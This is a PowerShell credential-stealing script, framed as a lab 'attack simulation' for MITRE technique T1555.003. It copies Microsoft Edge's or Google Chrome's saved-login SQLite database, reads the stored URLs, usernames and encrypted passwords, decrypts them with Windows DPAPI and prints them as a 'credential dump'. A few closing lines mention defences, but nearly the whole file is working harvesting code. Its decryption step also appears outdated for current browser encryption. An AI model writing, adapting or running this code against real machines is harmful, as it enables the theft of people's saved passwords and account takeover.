# Advanced Browser Credential Decryption Script
# Extracts ACTUAL usernames and passwords from Edge browser
# Uses Windows DPAPI for password decryption
# SAFE FOR LAB USE ONLY - Controlled Environment

Add-Type -AssemblyName System.Security

function Decrypt-EdgePassword {
    param([byte[]]$EncryptedData)
    
    try {
        # Edge/Chrome use DPAPI encryption
        $decrypted = [System.Security.Cryptography.ProtectedData]::Unprotect(
            $EncryptedData,
            $null,
            [System.Security.Cryptography.DataProtectionScope]::CurrentUser
        )
        return [System.Text.Encoding]::UTF8.GetString($decrypted)
    }
    catch {
        return "[DECRYPTION FAILED]"
    }
}

Write-Host "`n╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Cyan
Write-Host "║   BROWSER CREDENTIAL EXTRACTION - T1555.003                  ║" -ForegroundColor Cyan
Write-Host "║   Target: Microsoft Edge Browser                             ║" -ForegroundColor Cyan
Write-Host "║   Mode: FULL EXTRACTION (Lab Environment)                    ║" -ForegroundColor Cyan
Write-Host "╚══════════════════════════════════════════════════════════════╝`n" -ForegroundColor Cyan

$edgePath = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Login Data"
$tempDb = "$env:TEMP\edge_creds_$(Get-Random).db"

if (!(Test-Path $edgePath)) {
    Write-Host "[-] Edge Login Data not found at: $edgePath" -ForegroundColor Red
    
    # Check for Chrome as fallback
    $chromePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
    if (Test-Path $chromePath) {
        Write-Host "[*] Switching to Chrome database..." -ForegroundColor Yellow
        $edgePath = $chromePath
    }
    else {
        Write-Host "[-] No browser credential databases found!" -ForegroundColor Red
        exit 1
    }
}

Write-Host "[+] Browser credential database found!" -ForegroundColor Green
Write-Host "    Location: $edgePath" -ForegroundColor Gray

$dbInfo = Get-Item $edgePath
Write-Host "    Size: $([math]::Round($dbInfo.Length/1KB, 2)) KB" -ForegroundColor Gray
Write-Host "    Last Modified: $($dbInfo.LastWriteTime)" -ForegroundColor Gray

try {
    # Copy database to avoid lock
    Write-Host "`n[*] Copying database to temporary location..." -ForegroundColor Cyan
    Copy-Item -Path $edgePath -Destination $tempDb -Force -ErrorAction Stop
    Write-Host "[+] Database copied successfully" -ForegroundColor Green
    
    # Load SQLite (try to use built-in .NET SQLite if available)
    Write-Host "`n[*] Attempting to read credential entries..." -ForegroundColor Cyan
    
    # Method 1: Try using System.Data.SQLite if available
    try {
        Add-Type -Path "C:\Windows\Microsoft.NET\assembly\GAC_MSIL\System.Data.SQLite\*\System.Data.SQLite.dll" -ErrorAction Stop
        $useSQLite = $true
    }
    catch {
        $useSQLite = $false
    }
    
    if ($useSQLite) {
        # Use proper SQLite connection
        $connectionString = "Data Source=$tempDb;Version=3;Read Only=True;"
        $connection = New-Object System.Data.SQLite.SQLiteConnection($connectionString)
        $connection.Open()
        
        $query = "SELECT origin_url, username_value, password_value, date_created FROM logins"
        $command = $connection.CreateCommand()
        $command.CommandText = $query
        $reader = $command.ExecuteReader()
        
        $credentials = @()
        while ($reader.Read()) {
            $url = $reader["origin_url"]
            $username = $reader["username_value"]
            $encryptedPassword = [byte[]]$reader["password_value"]
            
            if ($username -and $encryptedPassword.Length -gt 0) {
                $password = Decrypt-EdgePassword -EncryptedData $encryptedPassword
                $credentials += [PSCustomObject]@{
                    URL      = $url
                    Username = $username
                    Password = $password
                }
            }
        }
        
        $reader.Close()
        $connection.Close()
        
    }
    else {
        # Fallback: Manual binary parsing (less reliable but works without SQLite module)
        Write-Host "[!] SQLite module not available, using binary extraction..." -ForegroundColor Yellow
        
        $bytes = [System.IO.File]::ReadAllBytes($tempDb)
        $text = [System.Text.Encoding]::ASCII.GetString($bytes)
        
        # Extract URLs using regex
        $urls = [regex]::Matches($text, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}[^\s\x00]{0,50}') | 
        Select-Object -ExpandProperty Value -Unique | 
        Where-Object { $_ -notmatch '[\x00-\x1F]' } |
        Select-Object -First 15
        
        $credentials = @()
        foreach ($url in $urls) {
            $credentials += [PSCustomObject]@{
                URL      = $url
                Username = "[Binary extraction - username not available]"
                Password = "[Requires SQLite module for decryption]"
            }
        }
    }
    
    # Display results
    if ($credentials.Count -gt 0) {
        Write-Host "`n[+] EXTRACTED CREDENTIALS: $($credentials.Count) entries found`n" -ForegroundColor Green
        Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Yellow
        Write-Host "║                    CREDENTIAL DUMP                           ║" -ForegroundColor Yellow
        Write-Host "╚══════════════════════════════════════════════════════════════╝`n" -ForegroundColor Yellow
        
        $counter = 1
        foreach ($cred in $credentials) {
            Write-Host "[$counter] " -NoNewline -ForegroundColor Cyan
            Write-Host "URL: " -NoNewline -ForegroundColor Gray
            Write-Host "$($cred.URL)" -ForegroundColor White
            
            Write-Host "    Username: " -NoNewline -ForegroundColor Gray
            Write-Host "$($cred.Username)" -ForegroundColor Yellow
            
            Write-Host "    Password: " -NoNewline -ForegroundColor Gray
            Write-Host "$($cred.Password)" -ForegroundColor Red
            Write-Host ""
            
            $counter++
        }
        
        Write-Host "╔══════════════════════════════════════════════════════════════╗" -ForegroundColor Green
        Write-Host "║  EXTRACTION COMPLETE - $($credentials.Count) credentials harvested" -ForegroundColor Green
        Write-Host "╚══════════════════════════════════════════════════════════════╝`n" -ForegroundColor Green
        
    }
    else {
        Write-Host "`n[!] No credentials found in database" -ForegroundColor Yellow
        Write-Host "    (Database may be empty or credentials are stored elsewhere)" -ForegroundColor Gray
    }
    
}
catch {
    Write-Host "`n[-] Error during extraction: $_" -ForegroundColor Red
    Write-Host $_.Exception.Message -ForegroundColor Red
}
finally {
    # Cleanup
    if (Test-Path $tempDb) {
        Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
    }
}

Write-Host "`n[*] Attack simulation complete!" -ForegroundColor Cyan
Write-Host "[!] This demonstrates the full impact of browser credential theft" -ForegroundColor Yellow
Write-Host "[!] In production: Enable Credential Guard, use password managers, enable MFA" -ForegroundColor Yellow
